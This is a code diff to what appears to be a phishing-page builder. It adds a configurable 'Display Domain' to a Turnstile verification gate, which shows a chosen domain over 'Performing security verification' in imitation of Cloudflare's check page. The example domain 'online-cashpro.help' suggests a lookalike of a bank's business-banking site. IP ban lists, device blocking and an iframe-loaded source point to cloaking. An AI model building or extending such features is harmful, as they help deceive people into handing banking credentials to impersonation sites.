@@ -1491,7 +1491,8 @@ function createPackageRuntimeIndex(page, pagePackage) {
       turnstile: {
         enabled: Boolean(page.securityConfig?.captcha),
         provider: "turnstile",
-        siteKey: page.securityConfig?.turnstile?.siteKey || page.securityConfig?.turnstileSiteKey || ""
+        siteKey: page.securityConfig?.turnstile?.siteKey || page.securityConfig?.turnstileSiteKey || "",
+        displayDomain: page.securityConfig?.turnstile?.displayDomain || ""
       }
     },
     generatedFile: page.generatedFile,
@@ -1534,6 +1535,23 @@ function createPackageRuntimeIndex(page, pagePackage) {
         min-height: 90px;
         display: grid;
         place-items: center;
+        gap: 16px;
+        text-align: center;
+      }
+      #deuceGateText {
+        display: none;
+        color: #111827;
+      }
+      #deuceGateText.active { display: block; }
+      #deuceGateText h1 {
+        margin: 0 0 6px;
+        font-size: clamp(1.25rem, 5vw, 1.85rem);
+        line-height: 1.1;
+      }
+      #deuceGateText p {
+        margin: 0;
+        color: #4b5563;
+        font-size: 0.95rem;
       }
       #deuceBlock {
         min-height: 100vh;
@@ -1560,6 +1578,10 @@ function createPackageRuntimeIndex(page, pagePackage) {
     <iframe id="deuceFrame" title="${escapeHtml(page.name)}"></iframe>
     <section id="deuceGate">
       <article>
+        <div id="deuceGateText">
+          <h1 id="deuceGateDomain"></h1>
+          <p>Performing security verification</p>
+        </div>
         <div id="deuceTurnstile"></div>
       </article>
     </section>
@@ -1577,10 +1599,13 @@ function createPackageRuntimeIndex(page, pagePackage) {
       const host = window.location.hostname;
       const frame = document.getElementById("deuceFrame");
       const gate = document.getElementById("deuceGate");
+      const gateText = document.getElementById("deuceGateText");
+      const gateDomain = document.getElementById("deuceGateDomain");
       const turnstileMount = document.getElementById("deuceTurnstile");
       const block = document.getElementById("deuceBlock");
       const blockCopy = document.getElementById("deuceBlockCopy");
       const captcha = config.security?.captcha && config.security?.turnstile?.siteKey;
+      const displayDomain = String(config.security?.turnstile?.displayDomain || "").trim();
 
       function normalizeHost(value) {
         return String(value || "").trim().toLowerCase().replace(/^https?:\\/\\//, "").replace(/\\/.*$/, "").replace(/:\\d+$/, "");
@@ -1614,7 +1639,9 @@ function createPackageRuntimeIndex(page, pagePackage) {
       function loadPage() {
         gate.classList.remove("active");
         frame.classList.remove("pending");
-        frame.src = config.runtime.sourceEndpoint;
+        const sourceUrl = new URL(config.runtime.sourceEndpoint, window.location.href);
+        sourceUrl.searchParams.set("hostname", window.location.hostname);
+        frame.src = sourceUrl.toString();
       }
 
       function verifyToken(token) {
@@ -1632,6 +1659,10 @@ function createPackageRuntimeIndex(page, pagePackage) {
 
       function loadTurnstile() {
         frame.classList.add("pending");
+        if (displayDomain) {
+          gateDomain.textContent = displayDomain;
+          gateText.classList.add("active");
+        }
         gate.classList.add("active");
         const script = document.createElement("script");
         script.src = "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit";
@@ -4245,6 +4276,10 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
         <span>Turnstile secret key</span>
         <input type="password" data-security-field="turnstileSecretKey" value="${escapeHtml(turnstile.secretKey || security.turnstileSecretKey || "")}" placeholder="Keep this server-side">
       </label>
+      <label>
+        <span>Display Domain</span>
+        <input type="text" data-security-field="turnstileDisplayDomain" value="${escapeHtml(turnstile.displayDomain || "")}" placeholder="online-cashpro.help">
+      </label>
       <p>The generated index.html receives only the site key. The secret key stays in your API config for verification.</p>
       <button type="button" data-save-security="${routeKey}" data-save-security-tab="security">Save Turnstile</button>
     </article>
@@ -4899,6 +4934,7 @@ function saveSecurityConfig(page, tab = "security") {
   const captchaField = preview.querySelector('[data-security-field="captcha"]');
   const turnstileSiteKeyField = preview.querySelector('[data-security-field="turnstileSiteKey"]');
   const turnstileSecretKeyField = preview.querySelector('[data-security-field="turnstileSecretKey"]');
+  const turnstileDisplayDomainField = preview.querySelector('[data-security-field="turnstileDisplayDomain"]');
   const bannedField = preview.querySelector('[data-security-field="bannedIps"]');
   const whitelistField = preview.querySelector('[data-security-field="whitelistIps"]');
   const blockedDevices = [...preview.querySelectorAll("[data-security-device]:checked")].map((field) => field.dataset.securityDevice);
@@ -4921,7 +4957,8 @@ function saveSecurityConfig(page, tab = "security") {
     turnstile: {
       provider: "turnstile",
       siteKey: turnstileSiteKeyField ? turnstileSiteKeyField.value.trim() : currentTurnstile.siteKey || current.turnstileSiteKey || "",
-      secretKey: turnstileSecretKeyField ? turnstileSecretKeyField.value.trim() : currentTurnstile.secretKey || current.turnstileSecretKey || ""
+      secretKey: turnstileSecretKeyField ? turnstileSecretKeyField.value.trim() : currentTurnstile.secretKey || current.turnstileSecretKey || "",
+      displayDomain: turnstileDisplayDomainField ? turnstileDisplayDomainField.value.trim() : currentTurnstile.displayDomain || ""
     },
     bannedIps: ipRules.bannedIps,
     whitelistIps: ipRules.whitelistIps,
